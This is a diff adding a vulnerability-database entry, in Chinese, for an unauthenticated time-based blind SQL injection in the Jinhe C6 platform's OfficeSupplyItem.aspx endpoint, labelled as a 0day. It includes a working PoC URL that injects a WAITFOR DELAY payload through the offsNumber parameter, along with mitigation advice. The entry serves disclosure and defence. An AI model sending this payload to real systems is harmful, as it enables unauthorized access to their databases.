@@ -1,0 +1,15 @@
+vendor = "金和"
+name = "金和C6协同管理平台 OfficeSupplyItem.aspx SQL注入漏洞"
+type = "SQL注入"
+version = "金和C6协同管理平台（厂商暂未公布受影响版本区间）"
+path = "/C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx"
+detail = """金和C6协同管理平台办公用品模块 /C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx 接口存在 SQL 注入漏洞，未经身份验证的攻击者可通过 id、offsNumber 参数构造恶意 SQL 语句进行时间盲注，获取数据库敏感信息。该漏洞暂未分配 CVE 编号。
+PoC:
+```
+/C6/Jhsoft.Web.officesupply/OfficeSupplyItem.aspx/?id=1&offsNumber=1'; IF (SELECT DB_NAME()) = 'C6' WAITFOR DELAY '0:0:4'--
+```
+最早披露: 2026-07-23"""
+fix = "联系金和网络厂商获取官方修复补丁或安全更新；临时措施：对 /C6/Jhsoft.Web.officesupply/ 路径添加登录态校验；将用户入参改为参数化查询或预编译语句；通过 WAF/反向代理拦截该路径的 SQL 注入特征请求；限制该接口仅允许内网访问，不暴露于公网。"
+date = 20260723
+label = "0day"
+verifier = "YGnight"
